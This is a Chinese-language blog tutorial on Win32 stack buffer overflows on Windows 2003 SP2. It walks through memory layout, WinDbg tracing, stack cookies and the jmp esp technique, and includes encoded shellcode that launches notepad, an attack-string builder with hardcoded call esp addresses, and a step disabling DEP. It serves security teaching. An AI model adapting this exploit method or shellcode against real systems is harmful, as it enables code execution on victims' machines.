<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>win32-shellcode | wd-z711&#39;s B10g</title>
  <meta name="author" content="wd-z711">
  
  <meta name="description" content="Common student in China. Interested in web &amp; re.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="win32-shellcode"/>
  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-YHJSKZDC3Y', 'auto');
  ga('send', 'pageview');
</script>




<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> win32-shellcode</h1>
		</div>
	



<div class="row post">

	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="Win32缓冲区溢出-amp-shellcode"><a href="#Win32缓冲区溢出-amp-shellcode" class="headerlink" title="Win32缓冲区溢出 &amp; shellcode"></a>Win32缓冲区溢出 &amp; shellcode</h1><p><strong>本教程使用的系统：Windows2003 SP2。</strong></p>
<span id="more"></span>
<h2 id="0x00-win32程序地址"><a href="#0x00-win32程序地址" class="headerlink" title="0x00 win32程序地址"></a>0x00 win32程序地址</h2><p>​    写一个程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun3</span><span class="params">(<span class="type">int</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a*<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x=<span class="number">10</span>, y, z=<span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buff[<span class="number">64</span>];</span><br><span class="line">  <span class="type">int</span> a=<span class="number">5</span>,b,c=<span class="number">6</span>;</span><br><span class="line">  <span class="type">char</span> buff02[<span class="number">64</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;(.text)address of\n\tfun1=%p\n\tfun2=%p\n\tmain=%p\n&quot;</span>, fun1, fun2, main);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;(.data inited Global variable)address of\n\tx(inited)=%p\n\tz(inited)=%p\n&quot;</span>, &amp;x, &amp;z);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;(.bss uninited Global variable)address of\n\ty(uninit)=%p\n\n&quot;</span>, &amp;y);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;(stack)address of\n\targc   =%p\n\targv   =%p\n&quot;</span>, &amp;argc, &amp;argv);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;(Local  variable)address of\n\tbuff[64]=%p\n\tbuff02[64]=%p\n&quot;</span>, buff, buff02);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;(Local  variable)address of\n\ta(inited)   =%p\n\tb(uninit)   =%p\n\tc(inited)   =%p\n\n&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>知识点：</strong>C语言中，%p是打印地址，\t相当于Tab键。</p>
<p>​    编译并运行<code>cl mem_distribute.c &amp; mem_distribute.exe</code>。</p>
<p><img src="/images/win32-shellcode/image-20221129195519065.png" alt="image-20221129195519065" style="zoom:110%;" /></p>
<p>​    内存分布相当于这样：</p>
<p><img src="/images/win32-shellcode/image-20221129195715963.png" alt="image-20221129195715963" style="zoom:67%;" /></p>
<p>​    Win32进程的内存分布呈现与Linux IA32进程类似的内存分布，也分成代码、变量、堆栈区等。具有以下特点:</p>
<ol>
<li>可执行代码fun1，fun2，main存放在内存块0x0040xxxx的低地址端且按照源代码中的顺序从低地址到高地址排列 (先定义的函数的代码存放在内存的低地址)</li>
<li>全局变量(x,y,z)也存放内存块0x0040xxxx的低地址端，位于可执行代码之上(起始地址高于可执行代码的地址)。初始化的全局变量存放在低地址，而未初始化的全局变量位于高地址。</li>
<li>函数的入口参数的地址(0x0012 Fxxx)位于堆栈的高地址区，位于函数局部变量之上。</li>
</ol>
<p>​    由 3 可以推断出栈底（最高地址）位于0x0012FFFC，环境变量和局部变量处于进程的栈区。进一步的分析知道，函数的返回地址也位于进程的栈区。</p>
<p>​    整体上看，32位Win2003进程的内存映像上分成3大块：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7CXXXXXX //动态链接库的映射区，比如kernel32.dll,ntdll.dll</span><br><span class="line">0x00400000 //可执行程序的代码段及全局变量 (数据段)</span><br><span class="line">0x0012FFFC //堆栈区</span><br></pre></td></tr></table></figure>
<p><img src="/images/win32-shellcode/image-20221129200533283.png" alt="image-20221129200533283" style="zoom:60%;" /></p>
<p>​    进程有三种数据段:.text、 .data 、 .bss。</p>
<ol>
<li>.text(文本区): 只读的内存区，任何尝试对该区的写操作会导致段违法出错。文本区存放了程序的代码，包括main函数和其他子函数。</li>
<li>.data和.bss都是可写的，它们保存全局变量，.data段包含已初始化的静态变量，而.bss包含未初始化的数据。</li>
</ol>
<p>​    函数被调用所建立的栈帧包含了下面的信息：</p>
<ol>
<li>函数的返回地址。IA32的返回地址都是存放在被调用函数的栈帧里。</li>
<li>调用函数的栈帧信息，即栈顶和栈底（最高地址）。</li>
<li>为函数的局部变量分配的空间。</li>
<li>为被调用函数的参数分配的空间。</li>
</ol>
<p>​    返回地址位于高地址，局部变量位于底地址，因此对字符串的操作有可能覆盖返回地址。</p>
<p>​    mem_distribute.exe在Windows7下的运行结果每次都不同，这就说明了windows7对进程的地址空间布局使用了地址随机化机制，使得进程的地址空间每次运行均不同。</p>
<p>​    进一步的测试表明，Windows7动态链接库的加载基址不随进程的运行次数改变，然而，如果重新启动操作系统，则动态链接库的加载基址也会变化。</p>
<hr>
<h2 id="0x01-win32缓冲区溢出流程-amp-windbg-使用"><a href="#0x01-win32缓冲区溢出流程-amp-windbg-使用" class="headerlink" title="0x01 win32缓冲区溢出流程 &amp; windbg 使用"></a>0x01 win32缓冲区溢出流程 &amp; windbg 使用</h2><p>​    写程序overflow.c如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> largebuff[] =<span class="string">&quot;01234567890123456789ABCDEFGH&quot;</span>;  <span class="comment">//28 bytes</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> smallbuff[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">strcpy</span> (smallbuff, largebuff);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    foo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    编译并执行，程序报错。</p>
<p>​    准备使用WinDbg调试该程序。</p>
<p>​    输入u main，显示：</p>
<p><img src="/images/win32-shellcode/image-20221129202032772.png" alt="image-20221129202032772" style="zoom:67%;" /></p>
<p>​    接着，输入u 00401005：</p>
<p><img src="/images/win32-shellcode/image-20221129202151398.png" alt="image-20221129202151398" style="zoom:90%;" /></p>
<p>​    接着，输入u foo L11：</p>
<p><img src="/images/win32-shellcode/image-20221129202646758.png" alt="image-20221129202646758" style="zoom:67%;" /></p>
<p>​    在foo函数的入口、strcpy调用点和函数的返回点用bp命令设置3个断点设置断点后，反汇编窗口中的相应行用红色背景突出显示。（命令为 bp overflow!foo，bp overflow!foo + 19，bp overflow!foo + 2e）</p>
<p>​    输入g启动进程：</p>
<p><img src="/images/win32-shellcode/image-20221129203553689.png" alt="image-20221129203553689" style="zoom:80%;" /></p>
<p>​    可以看到，<code>esp=0012ff74</code>中保存了 foo 的返回地址。</p>
<p>​    用dd esp命令显示堆栈的内容为<code>A=00401058</code>。该地址是函数main第4条汇编指令的地址，而main的第3条汇编指令为 <code>calloverflow!ILT+0(foo)(00401005)</code>。<br>​    输入命令g运行到下一个断点（这是<code>strcpy(smallbuff, largebuff);</code>函数）：</p>
<p><img src="/images/win32-shellcode/image-20221129204423824.png" alt="image-20221129204423824" style="zoom:67%;" /></p>
<p>​    可见smallbuf的起始地址<code>B=0012ff5c</code>，largebuf的起始地址为<code>0041b000</code>。返回地址与smallbuf的起始地址的距离<code>OFF SET=A-B=Ox18=24</code>因此，可以推测返回地址被覆盖为largebuf偏移24开始的4个字符“EFGH”。以下命令的结果也证实了这点：</p>
<p><img src="/images/win32-shellcode/image-20221129205002417.png" alt="image-20221129205002417" style="zoom:120%;" /></p>
<p>​    输入g继续执行，输出：</p>
<p><img src="/images/win32-shellcode/image-20221129205116590.png" alt="image-20221129205116590" style="zoom:67%;" /></p>
<p>​    可以看到，程序并未执行到第3个断点，而是跳转到内核去执行其他的指令。这<strong>是因为新版本的VC编译器默认打开了函数的安全检查，即securitycheck，对应于函数foo的以下两条汇编指令</strong>：</p>
<p><img src="/images/win32-shellcode/image-20221129205304126.png" alt="image-20221129205304126" style="zoom:67%;" /></p>
<p>​    security check机制是这样的：</p>
<ol>
<li>函数foo先根据 security_cookie保存一个cookie，再执行其他指令。</li>
<li>函数foo退出之前调用_security_check_cookie，并检查cookie的值是否被改写。若cookie被改写，则说明出现了缓冲区溢出错误，引发异常且中断程序的执行，从而防止了错误的进一步扩散。</li>
</ol>
<p>​    一般来说，如果打开了编译器的安全检查则缓冲区溢出漏洞虽然也能破坏进程的内存空间 (相邻的变量)，<strong>但并不能导致进程被劫持</strong>。这是因为即使返回地址被改写函数中的ret语句也不会被执行，从而无法改变进程的执行流程。</p>
<p>​    出现了缓冲区溢出错误，但进程未被劫持，进程未崩溃，可称之为“非崩溃错误”。这种错误隐藏得更深，危害很大。</p>
<p>​    为了演示进程被劫持的原理 我们关闭编译器的安全检查 用参数 /GS <strong>（控制堆栈探测，缓冲区安全检查）</strong>重新编译 overflow.c，命令为：<code>cl /Fd /Zi /GS- overflow.c</code>（/GS- 相当于关闭安全检查。）</p>
<p>​    再放入windbg中，看foo函数，发现：</p>
<p><img src="/images/win32-shellcode/image-20221129210447669.png" alt="image-20221129210447669" style="zoom:67%;" /></p>
<p>​    在<code>00401020</code>，<code>0040102f</code>，<code>0040103a</code>打断点。</p>
<p>​    执行到第一个断点，出现：</p>
<p><img src="/images/win32-shellcode/image-20221129211024519.png" alt="image-20221129211024519" style="zoom:60%;" /></p>
<p>​    执行到第二个断点，出现：</p>
<p><img src="/images/win32-shellcode/image-20221129211131529.png" alt="image-20221129211131529" style="zoom:60%;" /></p>
<p>​    可见smallbuf的起始地址<code>B=0012ff60</code>，函数的返回地址保存在地址为<code>A=0012ff74</code>的栈中。</p>
<p>​    返回地址所在的地址与smallbuf的起始地址的距离（偏移）<code>OFF_SET=A-B=0x14=20</code>。因此，可以推测返回地址被覆盖为largebuf偏移20开始的4个字符“ABCD”。以下命令的结果证实了这点：</p>
<p><img src="/images/win32-shellcode/image-20221129211635893.png" alt="image-20221129211635893" style="zoom:110%;" /></p>
<p>​    现在的OFFSET为0x14。若打开C编译器的安全检查，则OFF_SET为0x18，这多出的4个字节用于保存cookie的值。</p>
<p>​    继续运行到第3个断点：</p>
<p><img src="/images/win32-shellcode/image-20221129211813937.png" alt="image-20221129211813937" style="zoom:58%;" /></p>
<p>​    可见，ret之前esp指向的内存单元已经被覆盖为”ABCD”，或16进制数<code>0x44434241</code>。执行ret后的<code>eip=esp=0x44434241</code>，再进行<code>esp=esp+4</code>。继续输入p（单步执行），可以看到eip已被修改。</p>
<p><img src="/images/win32-shellcode/image-20221129212208061.png" alt="image-20221129212208061" style="zoom:80%;" /></p>
<p>​    从上面的溢出流程可以看到，执行ret指令后eip变成可以控制的内容，此时的esp增加4，指向输入字符串中返回地址所在的单元偏移4字节的地址。<br>​    <strong>如果把shellcode放到保存返回地址所在单元的后面（高地址），而把这个返回地址覆盖成一个包含jmp esp或call esp指令的地址，那么执行ret指令之后将跳转到shellcode。</strong></p>
<p><strong>WinDbg常用指令：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">u // 反汇编，为了确保能够正确反汇编，使用cl /Fd /Zi xx.c编译文件，以生成符号表文件xx.pdb</span><br><span class="line">u xx L11 // 相当于反汇编xx函数0x11条指令</span><br><span class="line">Alt+7 // 打开程序上下文窗口（disassembly）</span><br><span class="line">bp // 打断点，例如在foo函数第0x19条（16进制）汇编指令上打断点，就有bp overflow!foo + 19</span><br><span class="line">g or F5 // 启动进程</span><br><span class="line">dd xx // 输出xx的128个字节</span><br><span class="line">da xx // 以Ascii码输出xx指向的字符串</span><br><span class="line">p   // 单步执行(F10)</span><br><span class="line">.imgscan // 查看内存中的进程映像</span><br><span class="line">s 7c800000 L12b000 ff d4 // 起始地址为7c800000，size为12b000，找16进制为ff d4对应的位置</span><br><span class="line">s -u 522e0000 527d1000 &quot;web&quot;  //表示在522e0000 和527d1000之间搜索Unicode字符串&quot;web&quot;</span><br><span class="line">? // 显示常规命令，例如 ?0x000003cf，输出975</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="0x02-进程跳转"><a href="#0x02-进程跳转" class="headerlink" title="0x02 进程跳转"></a>0x02 进程跳转</h2><p>​    进程跳转攻击方法的基本思想：<strong>从系统必须加载的动态链接库（如ntdll.dll， kernel32.dll）中寻找call esp和jmp esp指令，记录下该地址 (溢出攻击的跳转地址)，将该地址覆盖函数的返回地址，而将shellcode放在返回地址所在单元的后面。</strong><br>​    攻击串（largebuf）的组织方式如下图所示：</p>
<p><img src="/images/win32-shellcode/image-20221129213154799.png" alt="image-20221129213154799" style="zoom:67%;" /></p>
<p>​    成功实现这种攻击方法的关键在于找到jmp esp（代码为0xe4ff）或call esp（代码为0xd4ff）的地址。</p>
<p>​    用WinDbg打开目标程序，输入 .imgscan 以查看内存中的进程映像。</p>
<p><img src="/images/win32-shellcode/image-20221129213623925.png" alt="image-20221129213623925" style="zoom:80%;" /></p>
<p>​    可见，在进程的内存空间中有3个文件的映像，他们分别是：</p>
<ol>
<li>可执行文件overflow.exe，在内存中的起始地址为0x00400000，大小为0x1e000。</li>
<li>KERNEL32.dll，映射到起始地址为7c800000，大小为0x12b000的进程内存空间。</li>
<li>ntdll.dll，映射到起始地址为7c930000，大小为0xd000的进程内存空间。</li>
</ol>
<p>​    找KERNEL32.dll与ntdll.dll的jmp esp（代码为0xe4ff）或call esp（代码为0xd4ff）指令，有：</p>
<p><img src="/images/win32-shellcode/image-20221129214526225.png" alt="image-20221129214526225" style="zoom:80%;" /></p>
<p>​    总结一波找到的地址：</p>
<p><img src="/images/win32-shellcode/image-20221129214700898.png" alt="image-20221129214700898" style="zoom:56%;" /></p>
<p><strong>注：</strong></p>
<ol>
<li>需要指出的是，不同版本的Windows系统 (相同版本打不同补丁后) 中的动态链接库 (及其加载地址) 是不同的，因此jmp esp和call esp指令在进程映像中的地址也是不同的。</li>
<li>尤其是windows 7及其后续版本，由于使用了地址随机化机制即使是同一个系统，下一次启动系统的动态链接库加载地址也有改变。</li>
<li>故对于windows 7及其后续版本，要成功实现缓冲区溢出攻击的概率极小。</li>
</ol>
<h2 id="0x03-缓冲区溢出攻击实例"><a href="#0x03-缓冲区溢出攻击实例" class="headerlink" title="0x03 缓冲区溢出攻击实例"></a>0x03 缓冲区溢出攻击实例</h2><p>​    已知，w32Lexploit.cpp中的函数overflow定义如下，w32Lexploit.cpp的完整代码在本节最后给出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_LEN 128</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">(<span class="type">char</span>* attackStr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buffer[BUFFER_LEN];</span><br><span class="line">  <span class="built_in">strcpy</span>(buffer,attackStr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    由于函数overflow中的局部变量buffer的容量只有128字节，若输入的数据attackStr过多，则将发生缓冲区溢出错误。<br>​    正确可靠的方法通过WinDbg跟踪该程序的执行而确定返回地址与buffer起始地址的距离。<br>​    使用<code>cl /Zi/GS- srclw32Lexploit.cpp</code>编译为可执行代码，并进行调试：</p>
<p><img src="/images/win32-shellcode/image-20221129221725713.png" alt="image-20221129221725713" style="zoom:67%;" /></p>
<p><img src="/images/win32-shellcode/image-20221129221919706.png" alt="image-20221129221919706" style="zoom:50%;" /></p>
<p>​    <code>0012fb5c-0012fad8=0x84</code>，因此偏移为0x84=132。</p>
<p>​    一般来说，一类平台下的shellcode具有一定的通用性，只要进行少量修改就可实现所需的功能。平时要多收集一些shellcode备用。</p>
<p>​    w32Lexploit.cpp中的shellcode可以在被攻击的目标机器上创建一个新的进程，并打开记事本notepad.exe。如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="comment">/* 287=0x11f bytes */</span></span><br><span class="line"><span class="string">&quot;\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x08\x01\x80\x34\x0b\xfe\xe2&quot;</span></span><br><span class="line"><span class="string">&quot;\xfa\xc3\xe8\xeb\xff\xff\xff\x96\x9b\x86\x9b\xfe\x96\x8e\x9f\x9a&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x96\x90\x91\x8a\x9b\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94&quot;</span></span><br><span class="line"><span class="string">&quot;\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee&quot;</span></span><br><span class="line"><span class="string">&quot;\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0&quot;</span></span><br><span class="line"><span class="string">&quot;\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde&quot;</span></span><br><span class="line"><span class="string">&quot;\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5&quot;</span></span><br><span class="line"><span class="string">&quot;\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>​    之后，在合适的位置放置跳转地址和shellcode以构建攻击字符串，将其拷贝到目标缓冲区以实现攻击。smashStack(char * shellcode)函数用于组织攻击代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ATTACK_BUFF_LEN 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_LEN 132 <span class="comment">// 0x84=132</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMPESP 0x7c99a01b  <span class="comment">// windows2003 sp2 ; sp1=0x7c84fa6a</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALLESP 0x7c81f2df  <span class="comment">// windows2003 sp2 7c81f2df,7c8366e2,7c874303 ; sp1=0x7c806b69  0x7c82334b，都是之前积累的。</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">smashStack</span><span class="params">(<span class="type">char</span> * shellcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Buff[ATTACK_BUFF_LEN];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *ps;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Buff, <span class="number">0x90</span>, ATTACK_BUFF_LEN);</span><br><span class="line"></span><br><span class="line">  ps = (<span class="type">unsigned</span> <span class="type">long</span> *)(Buff+OFF_SET);</span><br><span class="line">  *(ps) = CALLESP;</span><br><span class="line">  <span class="built_in">strcpy</span>(Buff+OFF_SET+<span class="number">4</span>, shellcode);</span><br><span class="line">  Buff[ATTACK_BUFF_LEN - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  overflow(Buff);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  smashStack(shellcode);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>
<p>​    运行之后，还是报错。这是由于系统启用了数据执行保护(DEP)，且DEP在当前的环境下生效，则该软件运行错误，系统弹出一个窗口，提示运行错误。</p>
<p>​    将<code>c:\boot.ini</code>的<code>/noexecute=optout</code>改成<code>/noexecute=AlwaysOff</code>即可。</p>
<p>​    w32Lexploit.cpp的完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 